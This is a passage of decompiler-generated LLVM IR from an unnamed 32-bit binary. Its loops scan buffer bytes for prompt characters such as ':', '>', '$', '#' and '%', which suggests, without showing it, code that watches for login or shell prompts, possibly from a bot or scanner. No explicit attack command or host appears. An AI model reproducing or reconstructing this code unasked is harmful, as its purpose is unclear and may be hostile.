  %v3_8050810 = load i32, i32* %v2_8050810, align 4
  %v2_8050814 = add i32 %v0_8050808, -16
  %v3_8050814 = inttoptr i32 %v2_8050814 to i32*
  store i32 %v3_8050810, i32* %v3_8050814, align 4
  %v0_8050815 = call i32 @function_8051d50()
  store i32 %v0_8050815, i32* %eax.global-to-local, align 4
  store i32 %v0_8050815, i32* @ebp, align 4
  %v10_805081f = icmp eq i32 %v0_8050815, -1
  %v1_8050822 = icmp eq i1 %v10_805081f, false
  br i1 %v1_8050822, label %dec_label_pc_8050c77, label %dec_label_pc_8050638.loopexit12.loopexit

dec_label_pc_8050830:                             ; preds = %dec_label_pc_80506aa
  %v1_8050830 = add i32 %v0_80506aa, 24
  %v2_8050830 = inttoptr i32 %v1_8050830 to i32*
  %v3_8050830 = load i32, i32* %v2_8050830, align 4
  %v1_8050833 = add i32 %v3_8050830, -1
  store i32 %v1_8050833, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_8050833, 1
  br i1 %tmp141, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_805083c.preheader

dec_label_pc_805083c.preheader:                   ; preds = %dec_label_pc_8050830
  %v7_805083c.pre = load i32, i32* @edx, align 4
  %v2_805083c = add i32 %v0_80506aa, 28
  br label %dec_label_pc_805083c

dec_label_pc_805083c:                             ; preds = %dec_label_pc_805083c.preheader, %dec_label_pc_805086d
  %v7_805083c = phi i32 [ %v7_805083c.pre, %dec_label_pc_805083c.preheader ], [ %v9_805083c, %dec_label_pc_805086d ]
  %v0_8050daf = phi i32 [ %v1_8050833, %dec_label_pc_805083c.preheader ], [ %v1_805086d, %dec_label_pc_805086d ]
  %v3_805083c = add i32 %v2_805083c, %v0_8050daf
  %v4_805083c = inttoptr i32 %v3_805083c to i8*
  %v5_805083c = load i8, i8* %v4_805083c, align 1
  %v6_805083c = zext i8 %v5_805083c to i32
  %v8_805083c = and i32 %v7_805083c, -256
  %v9_805083c = or i32 %v6_805083c, %v8_805083c
  store i32 %v9_805083c, i32* %edx.global-to-local, align 4
  %v10_8050840 = icmp eq i8 %v5_805083c, 58
  br i1 %v10_8050840, label %dec_label_pc_8050daf, label %dec_label_pc_8050849

dec_label_pc_8050849:                             ; preds = %dec_label_pc_805083c
  %v10_8050849 = icmp eq i8 %v5_805083c, 62
  br i1 %v10_8050849, label %dec_label_pc_8050daf, label %dec_label_pc_8050852

dec_label_pc_8050852:                             ; preds = %dec_label_pc_8050849
  %v10_8050852 = icmp eq i8 %v5_805083c, 36
  br i1 %v10_8050852, label %dec_label_pc_8050daf, label %dec_label_pc_805085b

dec_label_pc_805085b:                             ; preds = %dec_label_pc_8050852
  %v10_805085b = icmp eq i8 %v5_805083c, 35
  br i1 %v10_805085b, label %dec_label_pc_8050daf, label %dec_label_pc_8050864

dec_label_pc_8050864:                             ; preds = %dec_label_pc_805085b
  %v10_8050864 = icmp eq i8 %v5_805083c, 37
  br i1 %v10_8050864, label %dec_label_pc_8050daf, label %dec_label_pc_805086d

dec_label_pc_805086d:                             ; preds = %dec_label_pc_8050864
  %v1_805086d = add i32 %v0_8050daf, -1
  %v8_805086d = icmp eq i32 %v1_805086d, 0
  store i32 %v1_805086d, i32* %eax.global-to-local, align 4
  %v1_805086e = icmp eq i1 %v8_805086d, false
  br i1 %v1_805086e, label %dec_label_pc_805083c, label %dec_label_pc_8050638.backedge

dec_label_pc_8050875:                             ; preds = %dec_label_pc_80506aa
  %v1_8050875 = add i32 %v0_80506aa, 24
  %v2_8050875 = inttoptr i32 %v1_8050875 to i32*
  %v3_8050875 = load i32, i32* %v2_8050875, align 4
  %v1_8050878 = add i32 %v3_8050875, -1
  store i32 %v1_8050878, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_8050878, 1
  br i1 %tmp142, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050881.preheader

dec_label_pc_8050881.preheader:                   ; preds = %dec_label_pc_8050875
  %v7_8050881.pre = load i32, i32* @edx, align 4
  %v2_8050881 = add i32 %v0_80506aa, 28
  br label %dec_label_pc_8050881

dec_label_pc_8050881:                             ; preds = %dec_label_pc_8050881.preheader, %dec_label_pc_80508b2
  %v7_8050881 = phi i32 [ %v7_8050881.pre, %dec_label_pc_8050881.preheader ], [ %v9_8050881, %dec_label_pc_80508b2 ]
  %v0_8050cbd = phi i32 [ %v1_8050878, %dec_label_pc_8050881.preheader ], [ %v1_80508b2, %dec_label_pc_80508b2 ]
  %v3_8050881 = add i32 %v2_8050881, %v0_8050cbd
  %v4_8050881 = inttoptr i32 %v3_8050881 to i8*
  %v5_8050881 = load i8, i8* %v4_8050881, align 1
  %v6_8050881 = zext i8 %v5_8050881 to i32
  %v8_8050881 = and i32 %v7_8050881, -256
  %v9_8050881 = or i32 %v6_8050881, %v8_8050881
  store i32 %v9_8050881, i32* %edx.global-to-local, align 4
  %v10_8050885 = icmp eq i8 %v5_8050881, 58
  br i1 %v10_8050885, label %dec_label_pc_8050cbd, label %dec_label_pc_805088e

dec_label_pc_805088e:                             ; preds = %dec_label_pc_8050881
  %v10_805088e = icmp eq i8 %v5_8050881, 62
  br i1 %v10_805088e, label %dec_label_pc_8050cbd, label %dec_label_pc_8050897

dec_label_pc_8050897:                             ; preds = %dec_label_pc_805088e
  %v10_8050897 = icmp eq i8 %v5_8050881, 36
  br i1 %v10_8050897, label %dec_label_pc_8050cbd, label %dec_label_pc_80508a0

dec_label_pc_80508a0:                             ; preds = %dec_label_pc_8050897
  %v10_80508a0 = icmp eq i8 %v5_8050881, 35
  br i1 %v10_80508a0, label %dec_label_pc_8050cbd, label %dec_label_pc_80508a9

dec_label_pc_80508a9:                             ; preds = %dec_label_pc_80508a0
  %v10_80508a9 = icmp eq i8 %v5_8050881, 37
  br i1 %v10_80508a9, label %dec_label_pc_8050cbd, label %dec_label_pc_80508b2

dec_label_pc_80508b2:                             ; preds = %dec_label_pc_80508a9
  %v1_80508b2 = add i32 %v0_8050cbd, -1
  %v8_80508b2 = icmp eq i32 %v1_80508b2, 0
  store i32 %v1_80508b2, i32* %eax.global-to-local, align 4
  %v1_80508b3 = icmp eq i1 %v8_80508b2, false
  br i1 %v1_80508b3, label %dec_label_pc_8050881, label %dec_label_pc_8050638.backedge

dec_label_pc_80508c0:                             ; preds = %dec_label_pc_80506aa
  %v0_80508c0 = load i32, i32* @esp, align 4
  %v1_80508c3 = add i32 %v0_80508c0, -16
  %v2_80508c3 = inttoptr i32 %v1_80508c3 to i32*
  store i32 26, i32* %v2_80508c3, align 4
  %v2_80508c5 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80508c5, i32* %eax.global-to-local, align 4
  %v0_80508ca = load i32, i32* @esp, align 4
  %v1_80508ca = inttoptr i32 %v0_80508ca to i32*
  %v2_80508ca = load i32, i32* %v1_80508ca, align 4
  store i32 %v2_80508ca, i32* %eax.global-to-local, align 4
  %v3_80508ca = add i32 %v0_80508ca, 4
  %v1_80508cb = inttoptr i32 %v3_80508ca to i32*
  %v2_80508cb = load i32, i32* %v1_80508cb, align 4
  store i32 %v2_80508cb, i32* %edx.global-to-local, align 4
  %v1_80508cc = add i32 %v0_80508ca, 1880
  store i32 %v1_80508cc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80508cc, i32* %v1_80508cb, align 4
  store i32 26, i32* %v1_80508ca, align 4
  %v3_80508d6 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80508d6, i32* %eax.global-to-local, align 4
  %v0_80508db = load i32, i32* @esp, align 4
  %v1_80508db = add i32 %v0_80508db, 1880
  %v2_80508db = inttoptr i32 %v1_80508db to i32*
  %v3_80508db = load i32, i32* %v2_80508db, align 4
  %v1_80508e2 = add i32 %v3_80508db, -1
  store i32 %v1_80508e2, i32* %edx.global-to-local, align 4
  %v2_80508e3 = add i32 %v0_80508db, -4
  %v3_80508e3 = inttoptr i32 %v2_80508e3 to i32*
  store i32 %v1_80508e2, i32* %v3_80508e3, align 4
  %v2_80508e4 = add i32 %v0_80508db, -8
  %v3_80508e4 = inttoptr i32 %v2_80508e4 to i32*
  store i32 %v3_80508d6, i32* %v3_80508e4, align 4
  %v0_80508e5 = load i32, i32* @edi, align 4
  %v1_80508e5 = add i32 %v0_80508e5, 24
  %v2_80508e5 = inttoptr i32 %v1_80508e5 to i32*
  %v3_80508e5 = load i32, i32* %v2_80508e5, align 4
  store i32 %v3_80508e5, i32* %eax.global-to-local, align 4
  %v2_80508e8 = add i32 %v0_80508db, -12
  %v3_80508e8 = inttoptr i32 %v2_80508e8 to i32*
  store i32 %v3_80508e5, i32* %v3_80508e8, align 4
  %v1_80508e9 = add i32 %v0_80508db, 32
  %v2_80508e9 = inttoptr i32 %v1_80508e9 to i32*
  %v3_80508e9 = load i32, i32* %v2_80508e9, align 4
  store i32 %v3_80508e9, i32* %eax.global-to-local, align 4
  %v2_80508ed = add i32 %v0_80508db, -16
  %v3_80508ed = inttoptr i32 %v2_80508ed to i32*
  store i32 %v3_80508e9, i32* %v3_80508ed, align 4
  %v0_80508ee = call i32 @function_8051d50()
  %v0_80508f3 = load i32, i32* @esp, align 4
  %v1_80508f6 = add i32 %v0_80508ee, 1
  %v8_80508f6 = icmp eq i32 %v1_80508f6, 0
  store i32 %v1_80508f6, i32* %eax.global-to-local, align 4
  %v1_80508f7 = icmp eq i1 %v8_80508f6, false
  %v1_8050ea4 = add i32 %v0_80508f3, 16
  %v2_8050ea4 = inttoptr i32 %v1_8050ea4 to i32*
  store i32 26, i32* %v2_8050ea4, align 4
  %v2_8050ea6 = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050ea6, i32* %eax.global-to-local, align 4
  %v0_8050eab = load i32, i32* @esp, align 4
  %v1_8050eab = inttoptr i32 %v0_8050eab to i32*
  br i1 %v1_80508f7, label %dec_label_pc_8050ea1, label %dec_label_pc_80508fd

dec_label_pc_80508fd:                             ; preds = %dec_label_pc_80508c0
  store i32 25, i32* %v1_8050eab, align 4
  %v2_805090e = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805090e, i32* %eax.global-to-local, align 4
  %v0_8050913 = load i32, i32* @esp, align 4
  %v1_8050913 = inttoptr i32 %v0_8050913 to i32*
  %v3_8050913 = add i32 %v0_8050913, 4
  %v1_8050914 = inttoptr i32 %v3_8050913 to i32*
  %v1_8050915 = add i32 %v0_8050913, 1880
  store i32 %v1_8050915, i32* %eax.global-to-local, align 4
  store i32 %v1_8050915, i32* %v1_8050914, align 4
  store i32 25, i32* %v1_8050913, align 4
  %v3_805091f = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805091f, i32* %eax.global-to-local, align 4
  %v0_8050924 = load i32, i32* @esp, align 4
  %v1_8050924 = add i32 %v0_8050924, 1880
  %v2_8050924 = inttoptr i32 %v1_8050924 to i32*
  %v3_8050924 = load i32, i32* %v2_8050924, align 4
  %v1_805092b = add i32 %v3_8050924, -1
  store i32 %v1_805092b, i32* %edx.global-to-local, align 4
  %v2_805092c = add i32 %v0_8050924, -4
  %v3_805092c = inttoptr i32 %v2_805092c to i32*
  store i32 %v1_805092b, i32* %v3_805092c, align 4
  %v2_805092d = add i32 %v0_8050924, -8
  %v3_805092d = inttoptr i32 %v2_805092d to i32*
  store i32 %v3_805091f, i32* %v3_805092d, align 4
  %v0_805092e = load i32, i32* @edi, align 4
  %v1_805092e = add i32 %v0_805092e, 24
  %v2_805092e = inttoptr i32 %v1_805092e to i32*
  %v3_805092e = load i32, i32* %v2_805092e, align 4
  store i32 %v3_805092e, i32* @esi, align 4
  %v2_8050931 = add i32 %v0_8050924, -12
  %v3_8050931 = inttoptr i32 %v2_8050931 to i32*
  store i32 %v3_805092e, i32* %v3_8050931, align 4
  %v1_8050932 = add i32 %v0_8050924, 32
  %v2_8050932 = inttoptr i32 %v1_8050932 to i32*
  %v3_8050932 = load i32, i32* %v2_8050932, align 4
  store i32 %v3_8050932, i32* @ebx, align 4
  %v2_8050936 = add i32 %v0_8050924, -16
  %v3_8050936 = inttoptr i32 %v2_8050936 to i32*
  store i32 %v3_8050932, i32* %v3_8050936, align 4
  %v0_8050937 = call i32 @function_8051d50()
  store i32 %v0_8050937, i32* %eax.global-to-local, align 4
  %v0_805093c = load i32, i32* @esp, align 4
  store i32 %v0_8050937, i32* @ebp, align 4
  %v1_8050941 = add i32 %v0_805093c, 16
  %v2_8050941 = inttoptr i32 %v1_8050941 to i32*
  store i32 25, i32* %v2_8050941, align 4
  %v2_8050943 = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050943, i32* %eax.global-to-local, align 4
  %v0_8050948 = load i32, i32* @esp, align 4
  %v0_805094b = load i32, i32* @ebp, align 4
  %v10_805094b = icmp eq i32 %v0_805094b, -1
  br i1 %v10_805094b, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050954

dec_label_pc_8050954:                             ; preds = %dec_label_pc_80508fd
  %tmp143 = icmp slt i32 %v0_805094b, 1
  br i1 %tmp143, label %dec_label_pc_8050ad3, label %dec_label_pc_805095c

dec_label_pc_805095c:                             ; preds = %dec_label_pc_8050954
  %v0_805095c = load i32, i32* @edi, align 4
  %v1_805095c = inttoptr i32 %v0_805095c to i32*
  %v2_805095c = load i32, i32* %v1_805095c, align 4
  store i32 %v2_805095c, i32* %edx.global-to-local, align 4
  %v1_805095e = add i32 %v0_805095c, 16
  %v2_805095e = inttoptr i32 %v1_805095e to i32*
  %v3_805095e = load i32, i32* %v2_805095e, align 4
  store i32 %v3_805095e, i32* %eax.global-to-local, align 4
  %v2_8050961 = add i32 %v0_8050948, 52
  %v3_8050961 = inttoptr i32 %v2_8050961 to i32*
  store i32 %v2_805095c, i32* %v3_8050961, align 4
  %v0_8050965 = load i32, i32* @edi, align 4
  %v1_8050965 = add i32 %v0_8050965, 20
  %v2_8050965 = inttoptr i32 %v1_8050965 to i32*
  %v3_8050965 = load i32, i32* %v2_8050965, align 4
  store i32 %v3_8050965, i32* %edx.global-to-local, align 4
  %v0_8050968 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050968 = load i32, i32* @esp, align 4
  %v2_8050968 = add i32 %v1_8050968, 1872
  %v3_8050968 = inttoptr i32 %v2_8050968 to i32*
  store i32 %v0_8050968, i32* %v3_8050968, align 4
  %v0_805096f = load i32, i32* %edx.global-to-local, align 4
  %v1_805096f = trunc i32 %v0_805096f to i16
  %v2_805096f = load i32, i32* @esp, align 4
  %v3_805096f = add i32 %v2_805096f, 1882
  %v4_805096f = inttoptr i32 %v3_805096f to i16*
  store i16 %v1_805096f, i16* %v4_805096f, align 2
  %v0_8050977 = call i32 @function_805226f()
  store i32 %v0_8050977, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_8050977, 1
  br i1 %tmp144, label %dec_label_pc_80510de, label %dec_label_pc_8050984

dec_label_pc_8050984:                             ; preds = %dec_label_pc_80510ff, %dec_label_pc_80510de, %dec_label_pc_805095c
  %v0_8050984 = load i32, i32* @esp, align 4
  %v0_8050987 = load i32, i32* @edi, align 4
  %v1_8050987 = add i32 %v0_8050987, 4
  %v2_8050987 = inttoptr i32 %v1_8050987 to i32*
  %v3_8050987 = load i32, i32* %v2_8050987, align 4
  store i32 %v3_8050987, i32* @esi, align 4
  %v2_805098a = add i32 %v0_8050984, -16
  %v3_805098a = inttoptr i32 %v2_805098a to i32*
  store i32 %v3_8050987, i32* %v3_805098a, align 4
  %v1_805098b = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805098b, i32* %eax.global-to-local, align 4
  %v0_8050990 = load i32, i32* @edi, align 4
  %v1_8050990 = add i32 %v0_8050990, 4
  %v2_8050990 = inttoptr i32 %v1_8050990 to i32*
  store i32 -1, i32* %v2_8050990, align 4
  %v0_8050997 = load i32, i32* @edi, align 4
  %v1_8050997 = add i32 %v0_8050997, 12
  %v2_8050997 = inttoptr i32 %v1_8050997 to i32*
  store i32 0, i32* %v2_8050997, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_80509a1:                             ; preds = %dec_label_pc_8050ad3, %dec_label_pc_8050d4a, %dec_label_pc_8050a1e, %dec_label_pc_8051060, %dec_label_pc_8050ed4, %dec_label_pc_8050cd1, %dec_label_pc_8050dc3, %dec_label_pc_8050c7f, %dec_label_pc_8050c2e, %dec_label_pc_8050741, %dec_label_pc_8050e3c, %dec_label_pc_8050984
  %v0_80509a1 = load i32, i32* @edi, align 4
  %v1_80509a1 = add i32 %v0_80509a1, 24
  %v2_80509a1 = inttoptr i32 %v1_80509a1 to i32*
  %v3_80509a1 = load i32, i32* %v2_80509a1, align 4
  store i32 %v3_80509a1, i32* @edx, align 4
  store i32 %v3_80509a1, i32* %eax.global-to-local, align 4
  %v1_80509a6 = load i32, i32* @ebp, align 4
  %v2_80509a6 = sub i32 %v3_80509a1, %v1_80509a6
  %v8_80509a6 = xor i32 %v1_80509a6, %v3_80509a1
  %v9_80509a6 = xor i32 %v2_80509a6, %v3_80509a1
  %v10_80509a6 = and i32 %v9_80509a6, %v8_80509a6
  %v11_80509a6 = icmp slt i32 %v10_80509a6, 0
  %v12_80509a6 = icmp eq i32 %v2_80509a6, 0
  %v13_80509a6 = icmp slt i32 %v2_80509a6, 0
  %v3_80509a8 = icmp ne i1 %v13_80509a6, %v11_80509a6
  %v4_80509a8 = or i1 %v12_80509a6, %v3_80509a8
  br i1 %v4_80509a8, label %dec_label_pc_80509ac, label %dec_label_pc_80509aa

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_80509a1
  store i32 %v1_80509a6, i32* @edx, align 4
  br label %dec_label_pc_80509ac

dec_label_pc_80509ac:                             ; preds = %dec_label_pc_80509a1, %dec_label_pc_80509aa
  %v1_80509ac = phi i32 [ %v3_80509a1, %dec_label_pc_80509a1 ], [ %v1_80509a6, %dec_label_pc_80509aa ]
  %v2_80509ac = sub i32 %v3_80509a1, %v1_80509ac
  store i32 %v2_80509ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80509ac, i32* %v2_80509a1, align 4
  %v0_80509b1 = load i32, i32* @ebx, align 4
  %v1_80509b1 = load i32, i32* @esp, align 4
  %v2_80509b1 = add i32 %v1_80509b1, -4
  %v3_80509b1 = inttoptr i32 %v2_80509b1 to i32*
  store i32 %v0_80509b1, i32* %v3_80509b1, align 4
  %v0_80509b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80509b2 = add i32 %v1_80509b1, -8
  %v3_80509b2 = inttoptr i32 %v2_80509b2 to i32*
  store i32 %v0_80509b2, i32* %v3_80509b2, align 4
  %v1_80509b3 = add i32 %v1_80509b1, 16
  %v2_80509b3 = inttoptr i32 %v1_80509b3 to i32*
  %v3_80509b3 = load i32, i32* %v2_80509b3, align 4
  %v1_80509b7 = load i32, i32* @edx, align 4
  %v2_80509b7 = add i32 %v1_80509b7, %v3_80509b3
  store i32 %v2_80509b7, i32* %eax.global-to-local, align 4
  %v2_80509b9 = add i32 %v1_80509b1, -12
  %v3_80509b9 = inttoptr i32 %v2_80509b9 to i32*
  store i32 %v2_80509b7, i32* %v3_80509b9, align 4
  %v3_80509ba = load i32, i32* %v2_80509b3, align 4
  store i32 %v3_80509ba, i32* %ecx.global-to-local, align 4
  %v2_80509be = add i32 %v1_80509b1, -16
  %v3_80509be = inttoptr i32 %v2_80509be to i32*
  store i32 %v3_80509ba, i32* %v3_80509be, align 4
  %v4_80509bf = call i32 @function_80527a3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80509bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506aa

dec_label_pc_80509cc:                             ; preds = %dec_label_pc_80506aa
  %v1_80509cc = add i32 %v0_80506aa, 24
  %v2_80509cc = inttoptr i32 %v1_80509cc to i32*
  %v3_80509cc = load i32, i32* %v2_80509cc, align 4
  %v1_80509cf = add i32 %v3_80509cc, -1
  store i32 %v1_80509cf, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_80509cf, 1
  br i1 %tmp145, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_80509d8

dec_label_pc_80509d8:                             ; preds = %dec_label_pc_80509cc
  %v2_80509d8 = add i32 %v0_80506aa, 27
  %v3_80509d8 = add i32 %v2_80509d8, %v3_80509cc
  %v4_80509d8 = inttoptr i32 %v3_80509d8 to i8*
  %v5_80509d8 = load i8, i8* %v4_80509d8, align 1
  %v6_80509d8 = zext i8 %v5_80509d8 to i32
  %v7_80509d8 = load i32, i32* @edx, align 4
  %v8_80509d8 = and i32 %v7_80509d8, -256
  %v9_80509d8 = or i32 %v8_80509d8, %v6_80509d8
  store i32 %v9_80509d8, i32* %edx.global-to-local, align 4
  %v10_80509dc = icmp eq i8 %v5_80509d8, 62
  br i1 %v10_80509dc, label %dec_label_pc_8050a0a.thread, label %dec_label_pc_80509e1

dec_label_pc_80509e1:                             ; preds = %dec_label_pc_80509d8
  %v10_80509e1 = icmp eq i8 %v5_80509d8, 58
  br i1 %v10_80509e1, label %dec_label_pc_8050a0a.thread, label %dec_label_pc_80509e6

dec_label_pc_80509e6:                             ; preds = %dec_label_pc_80509e1, %dec_label_pc_8050a05
  %v0_80509f5 = phi i32 [ %v1_80509f5, %dec_label_pc_8050a05 ], [ %v1_80509cf, %dec_label_pc_80509e1 ]
  %v7_80509fc = phi i32 [ %v9_80509fc, %dec_label_pc_8050a05 ], [ %v9_80509d8, %dec_label_pc_80509e1 ]
  %v1_80509e6 = trunc i32 %v7_80509fc to i8
  %v10_80509e6 = icmp eq i8 %v1_80509e6, 36
  br i1 %v10_80509e6, label %dec_label_pc_8050a0a, label %dec_label_pc_80509eb

dec_label_pc_80509eb:                             ; preds = %dec_label_pc_80509e6
  %v10_80509eb = icmp eq i8 %v1_80509e6, 35
  br i1 %v10_80509eb, label %dec_label_pc_8050a0a, label %dec_label_pc_80509f0

dec_label_pc_80509f0:                             ; preds = %dec_label_pc_80509eb
  %v10_80509f0 = icmp eq i8 %v1_80509e6, 37
  br i1 %v10_80509f0, label %dec_label_pc_8050a0a, label %dec_label_pc_80509f5

dec_label_pc_80509f5:                             ; preds = %dec_label_pc_80509f0
  %v1_80509f5 = add i32 %v0_80509f5, -1
  %v8_80509f5 = icmp eq i32 %v1_80509f5, 0
  store i32 %v1_80509f5, i32* %eax.global-to-local, align 4
  br i1 %v8_80509f5, label %dec_label_pc_8050638.backedge, label %dec_label_pc_80509fc

dec_label_pc_80509fc:                             ; preds = %dec_label_pc_80509f5
  %v3_80509fc = add i32 %v2_80509d8, %v0_80509f5
  %v4_80509fc = inttoptr i32 %v3_80509fc to i8*
  %v5_80509fc = load i8, i8* %v4_80509fc, align 1
  %v6_80509fc = zext i8 %v5_80509fc to i32
  %v8_80509fc = and i32 %v7_80509fc, -256
  %v9_80509fc = or i32 %v6_80509fc, %v8_80509fc
  store i32 %v9_80509fc, i32* %edx.global-to-local, align 4
  %v10_8050a00 = icmp eq i8 %v5_80509fc, 58
  br i1 %v10_8050a00, label %dec_label_pc_8050a0a, label %dec_label_pc_8050a05

dec_label_pc_8050a05:                             ; preds = %dec_label_pc_80509fc
  %v10_8050a05 = icmp eq i8 %v5_80509fc, 62
  %v1_8050a08 = icmp eq i1 %v10_8050a05, false
  br i1 %v1_8050a08, label %dec_label_pc_80509e6, label %dec_label_pc_8050a0a

dec_label_pc_8050a0a.thread:                      ; preds = %dec_label_pc_80509e1, %dec_label_pc_80509d8
  store i32 %v3_80509cc, i32* @ebp, align 4
  br label %dec_label_pc_8050a16

dec_label_pc_8050a0a:                             ; preds = %dec_label_pc_8050a05, %dec_label_pc_80509fc, %dec_label_pc_80509f0, %dec_label_pc_80509eb, %dec_label_pc_80509e6
  %v0_8050a0a = phi i32 [ %v0_80509f5, %dec_label_pc_80509e6 ], [ %v0_80509f5, %dec_label_pc_80509eb ], [ %v0_80509f5, %dec_label_pc_80509f0 ], [ %v1_80509f5, %dec_label_pc_80509fc ], [ %v1_80509f5, %dec_label_pc_8050a05 ]
  %v1_8050a0a = add i32 %v0_8050a0a, 1
  store i32 %v1_8050a0a, i32* @ebp, align 4
  %v10_8050a0d = icmp eq i32 %v0_8050a0a, -2
  br i1 %v10_8050a0d, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050a16

dec_label_pc_8050a16:                             ; preds = %dec_label_pc_8050a0a.thread, %dec_label_pc_8050a0a
  %v1_8050a0a160 = phi i32 [ %v3_80509cc, %dec_label_pc_8050a0a.thread ], [ %v1_8050a0a, %dec_label_pc_8050a0a ]
  %tmp146 = icmp slt i32 %v1_8050a0a160, 1
  br i1 %tmp146, label %dec_label_pc_8050ad3, label %dec_label_pc_8050a1e

dec_label_pc_8050a1e:                             ; preds = %dec_label_pc_8050a16
  %v0_8050a1e = load i32, i32* @esp, align 4
  %v1_8050a21 = add i32 %v0_8050a1e, -16
  %v2_8050a21 = inttoptr i32 %v1_8050a21 to i32*
  store i32 20, i32* %v2_8050a21, align 4
  %v2_8050a23 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050a23, i32* %eax.global-to-local, align 4
  %v0_8050a28 = load i32, i32* @esp, align 4
  %v1_8050a28 = inttoptr i32 %v0_8050a28 to i32*
  %v2_8050a28 = load i32, i32* %v1_8050a28, align 4
  store i32 %v2_8050a28, i32* %eax.global-to-local, align 4
  %v3_8050a28 = add i32 %v0_8050a28, 4
  %v1_8050a29 = inttoptr i32 %v3_8050a28 to i32*
  %v2_8050a29 = load i32, i32* %v1_8050a29, align 4
  store i32 %v2_8050a29, i32* %edx.global-to-local, align 4
  %v1_8050a2a = add i32 %v0_8050a28, 1888
  store i32 %v1_8050a2a, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a2a, i32* %v1_8050a29, align 4
  store i32 20, i32* %v1_8050a28, align 4
  %v3_8050a34 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050a34, i32* %eax.global-to-local, align 4
  %v0_8050a39 = load i32, i32* @esp, align 4
  %v1_8050a39 = add i32 %v0_8050a39, -4
  %v2_8050a39 = inttoptr i32 %v1_8050a39 to i32*
  store i32 16384, i32* %v2_8050a39, align 4
  %v1_8050a3e = add i32 %v0_8050a39, 1888
  %v2_8050a3e = inttoptr i32 %v1_8050a3e to i32*
  %v3_8050a3e = load i32, i32* %v2_8050a3e, align 4
  store i32 %v3_8050a3e, i32* @esi, align 4
  %v2_8050a45 = add i32 %v0_8050a39, -8
  %v3_8050a45 = inttoptr i32 %v2_8050a45 to i32*
  store i32 %v3_8050a3e, i32* %v3_8050a45, align 4
  %v2_8050a46 = add i32 %v0_8050a39, -12
  %v3_8050a46 = inttoptr i32 %v2_8050a46 to i32*
  store i32 %v3_8050a34, i32* %v3_8050a46, align 4
  %v0_8050a47 = load i32, i32* @edi, align 4
  %v1_8050a47 = add i32 %v0_8050a47, 4
  %v2_8050a47 = inttoptr i32 %v1_8050a47 to i32*
  %v3_8050a47 = load i32, i32* %v2_8050a47, align 4
  store i32 %v3_8050a47, i32* @ebx, align 4
  %v2_8050a4a = add i32 %v0_8050a39, -16
  %v3_8050a4a = inttoptr i32 %v2_8050a4a to i32*
  store i32 %v3_8050a47, i32* %v3_8050a4a, align 4
  %v0_8050a4b = call i32 @function_8052984()
  store i32 %v0_8050a4b, i32* %eax.global-to-local, align 4
  %v0_8050a50 = load i32, i32* @esp, align 4
  %v1_8050a53 = add i32 %v0_8050a50, 28
  %v2_8050a53 = inttoptr i32 %v1_8050a53 to i32*
  store i32 16384, i32* %v2_8050a53, align 4
  %v1_8050a58 = add i32 %v0_8050a50, 24
  %v2_8050a58 = inttoptr i32 %v1_8050a58 to i32*
  store i32 2, i32* %v2_8050a58, align 4
  %v1_8050a5a = add i32 %v0_8050a50, 20
  %v2_8050a5a = inttoptr i32 %v1_8050a5a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050a5a, align 4
  %v0_8050a5f = load i32, i32* @edi, align 4
  %v1_8050a5f = add i32 %v0_8050a5f, 4
  %v2_8050a5f = inttoptr i32 %v1_8050a5f to i32*
  %v3_8050a5f = load i32, i32* %v2_8050a5f, align 4
  store i32 %v3_8050a5f, i32* %ecx.global-to-local, align 4
  %v2_8050a62 = add i32 %v0_8050a50, 16
  %v3_8050a62 = inttoptr i32 %v2_8050a62 to i32*
  store i32 %v3_8050a5f, i32* %v3_8050a62, align 4
  %v0_8050a63 = call i32 @function_8052984()
  store i32 %v0_8050a63, i32* %eax.global-to-local, align 4
  %v0_8050a68 = load i32, i32* @esp, align 4
  %v1_8050a68 = inttoptr i32 %v0_8050a68 to i32*
  store i32 20, i32* %v1_8050a68, align 4
  %v2_8050a6f = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050a6f, i32* %eax.global-to-local, align 4
  %v0_8050a77 = load i32, i32* @edi, align 4
  %v1_8050a77 = add i32 %v0_8050a77, 12
  %v2_8050a77 = inttoptr i32 %v1_8050a77 to i32*
  store i32 8, i32* %v2_8050a77, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050a83:                             ; preds = %dec_label_pc_80506aa
  %v1_8050a83 = add i32 %v0_80506aa, 24
  %v2_8050a83 = inttoptr i32 %v1_8050a83 to i32*
  %v3_8050a83 = load i32, i32* %v2_8050a83, align 4
  %v1_8050a86 = add i32 %v3_8050a83, -1
